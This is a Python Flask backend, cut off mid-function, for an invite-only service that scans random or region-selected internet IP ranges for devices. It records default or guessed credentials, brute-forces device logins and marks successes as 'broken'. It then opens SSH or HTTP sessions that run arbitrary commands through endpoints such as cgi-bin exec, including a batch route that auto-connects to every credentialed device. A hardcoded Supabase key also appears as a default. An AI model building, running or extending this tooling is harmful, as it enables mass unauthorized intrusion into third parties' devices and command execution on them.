import os, json, uuid, queue, threading, time
from datetime import datetime, timezone
from functools import wraps
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from dotenv import load_dotenv

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(BASE_DIR, '.env'))
app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'frontend', 'dist'), static_url_path='')

SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://fhlrvzhwjuepftwwnmtm.supabase.co")
SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZobHJ2emh3anVlcGZ0d3dubXRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNzIwNTcsImV4cCI6MjA5NzY0ODA1N30.8J9W654hvfn3oFHdv4M0yyeQeyWUOWuTEM6Dw6Ri5-M")
SUPABASE_SERVICE_ROLE_KEY = os.environ.get("SUPABASE_SERVICE_ROLE_KEY", "")

use_service_role = bool(SUPABASE_SERVICE_ROLE_KEY)
supabase_key = SUPABASE_SERVICE_ROLE_KEY if use_service_role else SUPABASE_ANON_KEY

supabase = None
if SUPABASE_URL and supabase_key:
    from supabase import create_client
    try:
        supabase = create_client(SUPABASE_URL, supabase_key)
    except Exception as e:
        print(f"[!] Supabase init error: {e}")

INVITE_ONLY = os.environ.get("INVITE_ONLY", "true").lower() == "true"

# ── Exploitation / SSH session management ──
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

exploit_sessions = {}
exploit_lock = threading.Lock()

def get_exploit_session(sid):
    with exploit_lock:
        return exploit_sessions.get(sid)

def del_exploit_session(sid):
    with exploit_lock:
        if sid in exploit_sessions:
            sess = exploit_sessions.pop(sid)
            try:
                sess["ssh"].close()
            except:
                pass

def get_supabase():
    return supabase

def verify_token(token):
    if not supabase:
        return None
    try:
        resp = supabase.auth.get_user(token)
        return resp.user
    except:
        return None

def ensure_user(uid, email):
    """Create public.users row if missing (backup for trigger)."""
    if not supabase:
        return
    try:
        existing = supabase.table("users").select("id").eq("id", uid).limit(1).execute()
        if not existing.data:
            username = email.split("@")[0] if email else uid[:8]
            supabase.table("users").insert({
                "id": uid, "email": email, "username": username,
            }).execute()
    except:
        pass

def get_user_by_token():
    auth_h = request.headers.get("Authorization", "")
    if not auth_h.startswith("Bearer "):
        return None
    return verify_token(auth_h[7:])

def require_auth(f):
    @wraps(f)
    def wrapper(*a, **kw):
        user = get_user_by_token()
        if not user:
            return jsonify({"error": "unauthorized"}), 401
        return f(user=user, *a, **kw)
    return wrapper

# ─────────────── Auth routes ───────────────
# Frontend sends email+password, backend handles Supabase Auth


@app.route("/api/auth/login", methods=["POST"])
def api_login():
    body = request.get_json(force=True)
    email = body.get("email", "").strip().lower()
    password = body.get("password", "")
    if not email or not password:
        return jsonify({"error": "email and password required"}), 400

    try:
        signin = supabase.auth.sign_in_with_password({"email": email, "password": password})
    except Exception as e:
        print(f"[auth] login error: {e}")
        return jsonify({"error": f"login failed: {e}"}), 401

    if not signin.session:
        return jsonify({"error": "login failed: no session"}), 401

    access_token = signin.session.access_token
    uid = signin.user.id if signin.user else ""
    username = email.split("@")[0]
    ensure_user(uid, email)
    try:
        if supabase:
            resp = supabase.table("users").select("*").eq("id", uid).limit(1).execute()
            if resp.data:
                username = resp.data[0].get("username", username)
    except:
        pass
    return jsonify({"status": "ok", "token": access_token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/register", methods=["POST"])
def api_register():
    body = request.get_json(force=True)
    email = body.get("email", "").strip().lower()
    password = body.get("password", "")
    invite = body.get("invite_code", "").strip()
    username = body.get("username", email.split("@")[0])

    if not email or not password:
        return jsonify({"error": "email and password required"}), 400
    if len(password) < 6:
        return jsonify({"error": "password must be 6+ characters"}), 400

    if INVITE_ONLY:
        if not invite:
            return jsonify({"error": "invitation code required"}), 400
        if supabase:
            try:
                inv = supabase.table("invite_codes").select("*").eq("code", invite).eq("status", "active").limit(1).execute()
                if not inv.data:
                    return jsonify({"error": "invalid or used invitation code"}), 400
            except Exception as e:
                return jsonify({"error": f"invite check failed: {e}"}), 500

    if not supabase:
        return jsonify({"error": "registration failed: no database connection"}), 500

    try:
        signup = supabase.auth.sign_up({"email": email, "password": password})
    except Exception as e:
        print(f"[auth] sign_up error: {e}")
        return jsonify({"error": f"registration failed: {e}"}), 500

    uid = signup.user.id if signup.user else ""
    if not uid:
        return jsonify({"error": "registration failed: no uid returned"}), 500

    try:
        supabase.table("users").upsert({
            "id": uid, "email": email, "username": username,
            "avatar_url": "", "bio": "", "created_at": datetime.now(timezone.utc).isoformat(),
        }).execute()
    except Exception as e:
        print(f"[db] upsert user warning: {e}")

    if INVITE_ONLY and invite:
        try:
            inv = supabase.table("invite_codes").select("*").eq("code", invite).eq("status", "active").limit(1).execute()
            if inv.data:
                inv_id = inv.data[0]["id"]
                supabase.table("invite_codes").update({
                    "status": "used", "used_by": uid, "used_at": datetime.now(timezone.utc).isoformat()
                }).eq("id", inv_id).execute()
        except Exception as e:
            print(f"[db] invite update warning: {e}")

    # Get JWT — sign_up may return session if auto-confirmed, otherwise sign in manually
    access_token = signup.session.access_token if signup.session else ""
    if not access_token:
        try:
            signin = supabase.auth.sign_in_with_password({"email": email, "password": password})
            access_token = signin.session.access_token if signin.session else ""
        except Exception as e:
            print(f"[auth] sign_in after register error: {e}")

    return jsonify({"status": "ok", "token": access_token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/me", methods=["GET"])
@require_auth
def api_me(user):
    return jsonify({"user": {"email": user.email, "uid": user.id, "username": user.email.split("@")[0]}})

@app.route("/api/auth/logout", methods=["POST"])
def api_logout():
    return jsonify({"status": "ok"})

@app.route("/api/auth/check-invite", methods=["GET"])
def api_check_invite():
    code = request.args.get("code", "")
    if not code:
        return jsonify({"valid": False}), 400
    if not INVITE_ONLY:
        return jsonify({"valid": True})
    try:
        inv = supabase.table("invite_codes").select("*").eq("code", code).eq("status", "active").limit(1).execute()
        return jsonify({"valid": len(inv.data) > 0})
    except:
        return jsonify({"valid": False})

# ─────────────── Scan results ───────────────

@app.route("/api/results", methods=["GET"])
@require_auth
def api_list_results(user):
    try:
        resp = supabase.table("scan_results").select("*").eq("user_id", user.id).order("created_at", desc=True).limit(100).execute()
        out = []
        for r in resp.data:
            r["id"] = str(r["id"])
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>", methods=["GET"])
@require_auth
def api_get_result(user, result_id):
    try:
        resp = supabase.table("scan_results").select("*").eq("id", result_id).eq("user_id", user.id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        data = resp.data[0]
        data["id"] = str(data["id"])
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>", methods=["DELETE"])
@require_auth
def api_delete_result(user, result_id):
    try:
        supabase.table("scan_result_items").delete().eq("result_id", result_id).execute()
        supabase.table("scan_results").delete().eq("id", result_id).eq("user_id", user.id).execute()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>/items", methods=["GET"])
@require_auth
def api_result_items(user, result_id):
    try:
        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).order("item_index").execute()
        out = []
        for r in resp.data:
            r["id"] = int(r.get("item_index", 0))
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>/items/broken", methods=["GET"])
@require_auth
def api_broken_items(user, result_id):
    try:
        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).eq("broken", True).execute()
        out = []
        for r in resp.data:
            r["id"] = int(r.get("item_index", 0))
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────── Device interaction ───────────────

@app.route("/api/devices/<item_id>/test", methods=["POST"])
@require_auth
def api_test_device(user, item_id):
    import requests as http_req
    from GetYourDevice import (
        extract_title, extract_form_fields, response_has_session_cookie,
        has_dashboard_content, has_login_form, count_failure_phrases,
        body_has_password_input, has_error_banner, body_has_success_phrases
    )
    from difflib import SequenceMatcher
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    ip = item.get("ip", "")
    port = item.get("port", 80)
    username = item.get("username", "admin")
    password = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"
    item_uuid = item["id"]

    result = {"status": "error", "message": ""}
    try:
        # First get unauth body for comparison
        unauth_body = ""
        unauth_title = ""
        unauth_forms = None
        try:
            u = http_req.get(f"{scheme}://{ip}:{port}", timeout=5, allow_redirects=False, verify=False)
            unauth_body = u.text or ""
            unauth_title = extract_title(unauth_body)
            unauth_forms = extract_form_fields(unauth_body)
        except:
            pass

        r = http_req.get(f"{scheme}://{ip}:{port}", auth=(username, password),
                         timeout=10, allow_redirects=False, verify=False)
        result["status_code"] = r.status_code
        result["headers"] = dict(r.headers)
        result["body_preview"] = r.text[:2000]

        if r.status_code == 401:
            result["message"] = "HTTP 401 Unauthorized"
        elif r.status_code in (302, 301):
            dest = r.headers.get("Location", "").lower()
            login_paths = ("login", "auth", "signin", "logon", "authenticate")
            if any(x in dest for x in login_paths):
                result["message"] = f"Redirected to {dest} (login page)"
            else:
                result["status"] = "ok"
                result["message"] = f"Redirect to {dest} — credentials accepted"
                supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
        elif r.status_code == 200:
            body = r.text or ""
            body_lower = body.lower()[:5000]

            # Scoring system
            score = 0
            reasons = []

            # Session cookie
            if response_has_session_cookie(r):
                score += 40
                reasons.append("session_cookie")

            # Dashboard content
            dc = has_dashboard_content(body_lower)
            if dc:
                score += 25
                reasons.append("dashboard_content")

            # Title change
            cur_title = extract_title(body)
            if cur_title and unauth_title:
                t1, t2 = cur_title.lower(), unauth_title.lower()
                if t1 != t2 and not any(x in t1 for x in ("login", "sign in", "signin", "authenticate", "password")):
                    score += 20
                    reasons.append("title_changed")

            # Form structure
            auth_forms = extract_form_fields(body)
            if unauth_forms and auth_forms:
                if unauth_forms["password_count"] > 0 and auth_forms["password_count"] == 0:
                    score += 30
                    reasons.append("no_more_password_field")

            # Success phrases
            sp = body_has_success_phrases(body)
            score += sp * 6
            if sp > 0:
                reasons.append("success_phrases")

            # Password field still present
            if body_has_password_input(body):
                score -= 40
                reasons.append("still_has_password")

            # Body similarity
            if unauth_body and len(body) > 200 and len(unauth_body) > 200:
                ratio = SequenceMatcher(None, body[:3000], unauth_body[:3000]).ratio()
                if ratio > 0.93:
                    score -= 50
                    reasons.append(f"body_similarity_{ratio:.2f}")
                elif ratio > 0.80:
                    score -= 20

            # Login form without dashboard
            if has_login_form(body_lower) and not dc:
                score -= 30
                reasons.append("login_form_no_dash")

            # Failure phrases
            fc = count_failure_phrases(body)
            score -= fc * 8
            if fc > 0:
                reasons.append(f"failure_phrases_{fc}")

            # Error banners
            if has_error_banner(body_lower):
                score -= 20
                reasons.append("error_banner")

            result["score"] = score
            result["reasons"] = reasons

            if score >= 25:
                result["status"] = "ok"
                result["message"] = f"Auth works (score={score})"
                supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
            elif score >= 0:
                result["message"] = f"Uncertain (score={score}): {', '.join(reasons)}"
            else:
                result["message"] = f"Auth rejected (score={score}): {', '.join(reasons)}"
        else:
            result["message"] = f"HTTP {r.status_code}"
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)


@app.route("/api/devices/<item_id>/brute", methods=["POST"])
@require_auth
def api_brute_device(user, item_id):
    import requests as http_req
    from GetYourDevice import (
        get_relevant_creds, extract_title, extract_form_fields,
        response_has_session_cookie, has_dashboard_content, has_login_form,
        count_failure_phrases, body_has_password_input, has_error_banner,
        body_has_success_phrases, _auth_attempt_counts, _auth_attempt_lock,
        MAX_AUTH_PER_IP
    )
    from difflib import SequenceMatcher
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    ip = item.get("ip", "")
    port = item.get("port", 80)
    device = item.get("device", "")
    scheme = "https" if port in (443, 8443, 9443) else "http"

    body_data = request.get_json(force=True) or {}
    custom_creds = body_data.get("creds", [])
    max_tries = int(body_data.get("max_tries", 50))

    # Get unauth baseline
    unauth_body = ""
    unauth_title = ""
    unauth_forms = None
    try:
        u = http_req.get(f"{scheme}://{ip}:{port}", timeout=5, allow_redirects=False, verify=False)
        unauth_body = u.text or ""
        unauth_title = extract_title(unauth_body)
        unauth_forms = extract_form_fields(unauth_body)
    except:
        pass

    if custom_creds:
        creds_to_try = custom_creds[:max_tries]
    else:
        creds_to_try = [(u, p, n) for u, p, n in get_relevant_creds(device, max_creds=max_tries)]

    working = []
    for user, pw, note in creds_to_try:
        if len(working) >= 5:
            break
        try:
            r = http_req.get(f"{scheme}://{ip}:{port}", auth=(user, pw),
                             timeout=5, allow_redirects=False, verify=False)
            if r.status_code == 401:
                continue
            if r.status_code in (302, 301):
                dest = r.headers.get("Location", "").lower()
                if not any(x in dest for x in ("login", "auth", "signin")):
                    working.append({"username": user, "password": pw, "note": note, "status": r.status_code, "score": 100})
                continue
            if r.status_code == 200:
                body = r.text or ""
                body_lower = body.lower()[:5000]
                score = 0
                if response_has_session_cookie(r): score += 40
                if has_dashboard_content(body_lower): score += 25
                cur_title = extract_title(body)
                if cur_title and unauth_title:
                    t1, t2 = cur_title.lower(), unauth_title.lower()
                    if t1 != t2 and not any(x in t1 for x in ("login", "sign in", "signin", "authenticate", "password")):
                        score += 20
                auth_forms = extract_form_fields(body)
                if unauth_forms and auth_forms:
                    if unauth_forms["password_count"] > 0 and auth_forms["password_count"] == 0:
                        score += 30
                score += body_has_success_phrases(body) * 6
                if body_has_password_input(body): score -= 40
                if unauth_body and len(body) > 200 and len(unauth_body) > 200:
                    ratio = SequenceMatcher(None, body[:3000], unauth_body[:3000]).ratio()
                    if ratio > 0.93: score -= 50
                    elif ratio > 0.80: score -= 20
                if has_login_form(body_lower): score -= 30
                score -= count_failure_phrases(body) * 8
                if has_error_banner(body_lower): score -= 20
                if score >= 25:
                    working.append({"username": user, "password": pw, "note": note, "status": r.status_code, "score": score})
        except:
            pass

    return jsonify({"status": "ok", "total_tried": len(creds_to_try), "working": working})

@app.route("/api/devices/<item_id>/access", methods=["POST"])
@require_auth
def api_access_device(user, item_id):
    import requests as http_req
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data or not resp.data[0].get("broken"):
            return jsonify({"error": "device not found or not broken yet"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    body = request.get_json(force=True) or {}
    action = body.get("action", "info")
    ip = item["ip"]
    port = item["port"]
    u = item.get("username", "admin")
    p = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"

    result = {"status": "error", "message": ""}
    try:
        if action == "info":
            r = http_req.get(f"{scheme}://{ip}:{port}", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "status_code": r.status_code, "headers": dict(r.headers), "body": r.text[:5000]}
        elif action == "exec":
            cmd = body.get("command", "id")
            r = http_req.get(f"{scheme}://{ip}:{port}/cgi-bin/exec?cmd={cmd}", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "output": r.text[:5000]}
        elif action == "config":
            r = http_req.get(f"{scheme}://{ip}:{port}/config", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "config": r.text[:5000]}
        elif action == "shell":
            cmd = body.get("command", "id")
            from seclist_loader import get_exploit_endpoints
            for ep in get_exploit_endpoints(item.get("device", "")):
                try:
                    r = http_req.get(f"{scheme}://{ip}:{port}{ep}?cmd={cmd}", auth=(u, p), timeout=5, verify=False)
                    if r.status_code == 200:
                        result = {"status": "ok", "endpoint": ep, "output": r.text[:5000]}
                        break
                except:
                    continue
            if result.get("status") != "ok":
                result = {"status": "ok", "message": "No shell endpoint found, creds work", "suggested_url": f"{scheme}://{ip}:{port}"}
        else:
            result = {"error": f"unknown action: {action}"}
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)


# ─────────────── Device Exploitation ───────────────

@app.route("/api/exploit/classify", methods=["POST"])
@require_auth
def api_classify_device(user):
    body = request.get_json(force=True) or {}
    device_name = body.get("device", "")
    from GetYourDevice import classify_device_type
    ctype = classify_device_type(device_name)
    return jsonify({"classification": ctype, "is_device": ctype == "device"})


@app.route("/api/exploit/devices", methods=["GET"])
@require_auth
def api_exploit_devices(user):
    from GetYourDevice import HARDWARE_DEVICE_NAMES
    try:
        resp = supabase.table("scan_result_items").select("*").eq("auth_found", True).order("id", desc=True).limit(500).execute()
        devices = []
        seen = set()
        for it in resp.data:
            ip = it.get("ip")
            if ip in seen:
                continue
            seen.add(ip)
            dn = (it.get("device") or "").lower()
            is_hw = any(kw in dn for kw in HARDWARE_DEVICE_NAMES[:80])
            if not is_hw:
                continue
            devices.append({
                "id": it["id"],
                "ip": it["ip"],
                "port": it["port"],
                "url": it.get("url"),
                "device": it.get("device"),
                "username": it.get("username"),
                "password": it.get("password"),
                "country_code": it.get("country_code"),
                "org": it.get("org"),
                "broken": it.get("broken", False),
            })
        return jsonify({"devices": devices, "total": len(devices)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/connect", methods=["POST"])
@require_auth
def api_exploit_connect(user):
    body = request.get_json(force=True) or {}
    item_id = body.get("item_id")
    if not item_id:
        return jsonify({"error": "item_id required"}), 400
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "device not found"}), 404
        item = resp.data[0]
        if not item.get("auth_found"):
            return jsonify({"error": "no credentials available"}), 400
        ip = item["ip"]
        port = item["port"]
        u = item.get("username", "admin")
        p = item.get("password", "admin")

        # Try SSH first
        ssh_port = 22
        ssh_ok = False
        if HAS_PARAMIKO:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=ssh_port, username=u, password=p, timeout=8, banner_timeout=8)
                sid = uuid.uuid4().hex[:12]
                with exploit_lock:
                    exploit_sessions[sid] = {
                        "id": sid, "item_id": item_id, "ip": ip,
                        "username": u, "password": p,
                        "ssh": client, "protocol": "ssh",
                        "created": time.time(),
                        "user_id": user.id,
                    }
                return jsonify({"status": "ok", "protocol": "ssh", "session_id": sid})
            except Exception as e:
                pass  # SSH failed, try HTTP shell

        # Fallback: HTTP shell session
        sid = uuid.uuid4().hex[:12]
        import requests as http_req
        scheme = "https" if port in (443, 8443, 9443) else "http"
        session = http_req.Session()
        session.auth = (u, p)
        with exploit_lock:
            exploit_sessions[sid] = {
                "id": sid, "item_id": item_id, "ip": ip,
                "username": u, "password": p,
                "session": session, "protocol": "http",
                "scheme": scheme, "port": port,
                "created": time.time(),
                "user_id": user.id,
            }
        msg = "SSH unavailable, using HTTP shell" if not HAS_PARAMIKO else "SSH failed, using HTTP shell"
        return jsonify({"status": "ok", "protocol": "http", "session_id": sid, "note": msg})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/session/<sid>/command", methods=["POST"])
@require_auth
def api_exploit_command(user, sid):
    sess = get_exploit_session(sid)
    if not sess:
        return jsonify({"error": "session not found or expired"}), 404
    if sess.get("user_id") != user.id:
        return jsonify({"error": "not your session"}), 403
    body = request.get_json(force=True) or {}
    cmd = body.get("command", "id")
    if not cmd:
        return jsonify({"error": "command required"}), 400
    try:
        if sess.get("protocol") == "ssh":
            _, stdout, stderr = sess["ssh"].exec_command(cmd, timeout=10)
            out = stdout.read().decode(errors="replace")[:10000]
            err = stderr.read().decode(errors="replace")[:5000]
            return jsonify({"status": "ok", "output": out, "stderr": err})
        else:
            import requests as http_req
            scheme = sess["scheme"]
            ip = sess["ip"]
            port = sess["port"]
            target = f"{scheme}://{ip}:{port}"
            from seclist_loader import get_exploit_endpoints
            for ep in get_exploit_endpoints(sess.get("device", "")):
                try:
                    r = sess["session"].get(f"{target}{ep}?cmd={cmd}", timeout=5, verify=False)
                    if r.status_code == 200:
                        return jsonify({"status": "ok", "output": r.text[:10000], "endpoint": ep})
                except:
                    continue
            return jsonify({"status": "ok", "output": "", "note": "No HTTP shell endpoint found"})
    except Exception as e:
        return jsonify({"error": str(e)[:300]}), 500


@app.route("/api/exploit/session/<sid>/disconnect", methods=["POST"])
@require_auth
def api_exploit_disconnect(user, sid):
    sess = get_exploit_session(sid)
    if not sess:
        return jsonify({"error": "session not found"}), 404
    if sess.get("user_id") != user.id:
        return jsonify({"error": "not your session"}), 403
    try:
        if sess.get("protocol") == "ssh":
            sess["ssh"].close()
    except:
        pass
    del_exploit_session(sid)
    return jsonify({"status": "ok", "message": "disconnected"})


@app.route("/api/exploit/sessions", methods=["GET"])
@require_auth
def api_exploit_sessions(user):
    with exploit_lock:
        sessions = []
        for sid, s in exploit_sessions.items():
            if s.get("user_id") == user.id:
                sessions.append({
                    "id": sid, "ip": s["ip"], "protocol": s.get("protocol", "http"),
                    "username": s.get("username"), "created": s.get("created"),
                    "item_id": s.get("item_id"),
                })
        return jsonify({"sessions": sessions, "count": len(sessions)})


@app.route("/api/exploit/batch", methods=["POST"])
@require_auth
def api_exploit_batch(user):
    """Try connecting to all hardware devices with creds automatically."""
    from GetYourDevice import HARDWARE_DEVICE_NAMES
    try:
        resp = supabase.table("scan_result_items").select("*").eq("auth_found", True).order("id", desc=True).limit(200).execute()
        results = []
        for it in resp.data:
            dn = (it.get("device") or "").lower()
            if not any(kw in dn for kw in HARDWARE_DEVICE_NAMES[:80]):
                continue
            ip = it["ip"]
            u = it.get("username", "admin")
            p = it.get("password", "admin")
            ssh_ok = False
            if HAS_PARAMIKO:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=22, username=u, password=p, timeout=6, banner_timeout=6)
                    sid = uuid.uuid4().hex[:12]
                    with exploit_lock:
                        exploit_sessions[sid] = {
                            "id": sid, "item_id": it["id"], "ip": ip,
                            "username": u, "password": p,
                            "ssh": client, "protocol": "ssh",
                            "created": time.time(), "user_id": user.id,
                        }
                    results.append({"ip": ip, "status": "connected", "protocol": "ssh", "session_id": sid})
                    ssh_ok = True
                except:
                    pass
            if not ssh_ok:
                import requests as http_req
                scheme = "https" if it["port"] in (443, 8443, 9443) else "http"
                try:
                    r = http_req.get(f"{scheme}://{ip}:{it['port']}", auth=(u, p), timeout=5, verify=False)
                    if r.status_code == 200:
                        sid = uuid.uuid4().hex[:12]
                        session = http_req.Session()
                        session.auth = (u, p)
                        with exploit_lock:
                            exploit_sessions[sid] = {
                                "id": sid, "item_id": it["id"], "ip": ip,
                                "username": u, "password": p,
                                "session": session, "protocol": "http",
                                "scheme": scheme, "port": it["port"],
                                "created": time.time(), "user_id": user.id,
                            }
                        results.append({"ip": ip, "status": "web_reachable", "session_id": sid})
                    else:
                        results.append({"ip": ip, "status": f"http_{r.status_code}"})
                except Exception as e:
                    results.append({"ip": ip, "status": "unreachable", "error": str(e)[:100]})
        return jsonify({"results": results, "total": len(results)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ─────────────── Scan API ───────────────

@app.route("/api/scan", methods=["POST"])
@require_auth
def api_scan(user):
    body = request.get_json(force=True)
    target = body.get("target", "")
    region = body.get("region", "")
    internet = body.get("internet", False)
    max_ips = int(body.get("max_ips", 500))
    threads = int(body.get("threads", 10))
    ports = body.get("ports", "fast")
    country = body.get("country", None)
    do_geo = body.get("geo", False)

    from GetYourDevice import (
        generate_region_ips, generate_internet_ips, generate_ips,
        scan_single, SCAN_PORTS, ALL_PORTS, GeoEnricher, REGION_CONFIG
    )
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from threading import Lock

    selected_ports = ALL_PORTS if ports == "all" else SCAN_PORTS
    cap = min(max_ips, int(os.environ.get("SCAN_CAP", "2000")))

    include_countries = None
    if country:
        include_countries = set(c.strip().upper() for c in country.split(",") if c.strip())

    if region and region in REGION_CONFIG:
        ips = generate_region_ips(region, cap, include_countries=include_countries)
    elif target:
        ips = generate_ips(target, cap)
    else:
        ips = generate_internet_ips(cap)

    all_results = []
    scanned = 0
    scanned_lock = Lock()
    results_lock = Lock()

    with ThreadPoolExecutor(max_workers=min(threads, 50)) as pool:
        fut_to_ip = {pool.submit(scan_single, ip, False, selected_ports): ip for ip in ips}
        for fut in as_completed(fut_to_ip):
            try:
                res = fut.result()
                if res:
                    with results_lock:
                        results.extend(res)
            except Exception:
                pass

    if do_geo and results:
        geo_ips = list(set(r["ip"] for r in results))
        geo_data = GeoEnricher.enrich_batch(geo_ips)
        for r in results:
            g = geo_data.get(r["ip"], {})
            r.update(g)

    uid = user.id
    creds_count = sum(1 for r in results if r.get("auth_found"))
    open_count = sum(1 for r in results if r.get("no_auth"))

    if results:
        try:
            scan_resp = supabase.table("scan_results").insert({
                "user_id": uid,
                "total_scanned": len(ips),
                "results_count": len(results),
                "creds_count": creds_count,
                "open_count": open_count,
                "region": region or "internet",
                "ports": ports,
                "created_at": datetime.now(timezone.utc).isoformat(),
            }).execute()
            result_id = scan_resp.data[0]["id"]
            items = []
            for i, r in enumerate(results):
                items.append({
                    "result_id": str(result_id),
                    "item_index": i,
                    "ip": r.get("ip"), "port": r.get("port"),
                    "url": r.get("url"), "device": r.get("device"),
                    "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
                    "username": r.get("username"), "password": r.get("password"),
                    "note": r.get("note"), "status_code": r.get("status_code"),
                    "country": r.get("country"), "country_code": r.get("country_code"),
                    "region_name": r.get("region"), "city": r.get("city"),
                    "lat": r.get("lat"), "lon": r.get("lon"),
                    "org": r.get("org"), "isp": r.get("isp"),
                    "as_info": r.get("as"),
                    "broken": False,
                })
            supabase.table("scan_result_items").insert(items).execute()
        except Exception as e:
            print(f"[!] DB save error: {e}")

    return jsonify({
        "status": "ok",
        "total_scanned": len(ips),
        "results_count": len(results),
        "results": results,
    })

@app.route("/api/scan/stream", methods=["POST"])
@require_auth
def api_scan_stream(user):
    from GetYourDevice import (
        generate_region_ips, generate_internet_ips, generate_ips,
        scan_single, SCAN_PORTS, ALL_PORTS, REGION_CONFIG
    )
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from threading import Lock

    body = request.get_json(force=True)
    target = body.get("target", "")
    region = body.get("region", "")
    internet = body.get("internet", False)
    max_ips = int(body.get("max_ips", 500))
    threads = int(body.get("threads", 10))
    ports = body.get("ports", "fast")
    country = body.get("country", None)
    do_geo = body.get("geo", False)

    selected_ports = ALL_PORTS if ports == "all" else SCAN_PORTS
    cap = min(max_ips, int(os.environ.get("SCAN_CAP", "2000")))

    include_countries = None
    if country:
        include_countries = set(c.strip().upper() for c in country.split(",") if c.strip())

    if region and region in REGION_CONFIG:
        ips = generate_region_ips(region, cap, include_countries=include_countries)
    elif target:
        ips = generate_ips(target, cap)
    else:
        ips = generate_internet_ips(cap)

    def event_stream():
        total = len(ips)
        yield f"event: start\ndata: {json.dumps({'total': total})}\n\n"

        all_results = []
        scanned = 0
        scanned_lock = Lock()
        results_lock = Lock()
        event_queue = queue.Queue()
        done = threading.Event()

        def heartbeat():
            while not done.is_set():
                event_queue.put(("ping", None))
                done.wait(5)
        hb = threading.Thread(target=heartbeat, daemon=True)
        hb.start()

        def scan_worker():
            nonlocal scanned
            with ThreadPoolExecutor(max_workers=min(threads, 50)) as pool:
                fut_map = {pool.submit(scan_single, ip, False, selected_ports): ip for ip in ips}
                for fut in as_completed(fut_map):
                    ip = fut_map[fut]
                    with scanned_lock:
                        scanned += 1
                    try:
                        res = fut.result()
                    except Exception:
                        res = None
                    if res:
                        with results_lock:
                            all_results.extend(res)
                        event_queue.put(("hit", {'ip': ip, 'results': res}))
                    event_queue.put(("progress", {'scanned': scanned, 'total': total, 'hits': len(all_results), 'ip': ip}))
            event_queue.put(("_done", None))

        sw = threading.Thread(target=scan_worker, daemon=True)
        sw.start()

        while True:
            try:
                evt_type, data = event_queue.get(timeout=10)
            except queue.Empty:
                yield f"event: ping\ndata: {json.dumps({'t': time.time()})}\n\n"
                continue
            if evt_type == "_done":
                break
            if evt_type == "ping":
                yield f"event: ping\ndata: {json.dumps({'t': time.time()})}\n\n"
            elif evt_type == "hit":
                yield f"event: hit\ndata: {json.dumps(data)}\n\n"
            elif evt_type == "progress":
                yield f"event: progress\ndata: {json.dumps(data)}\n\n"
        done.set()

        if do_geo and all_results:
            from GetYourDevice import GeoEnricher
            geo_ips = list(set(r["ip"] for r in all_results))
            geo_data = GeoEnricher.enrich_batch(geo_ips)
            for r in all_results:
                g = geo_data.get(r["ip"], {})
                r.update(g)

        uid = user.id
        creds_count = sum(1 for r in all_results if r.get("auth_found"))
        open_count = sum(1 for r in all_results if r.get("no_auth"))

        if all_results:
            try:
                scan_resp = supabase.table("scan_results").insert({
                    "user_id": uid,
                    "total_scanned": total,
                    "results_count": len(all_results),
                    "creds_count": creds_count,
                    "open_count": open_count,
                    "region": region or "internet",
                    "ports": ports,
                    "created_at": datetime.now(timezone.utc).isoformat(),
                }).execute()
                result_id = scan_resp.data[0]["id"]
                items = []
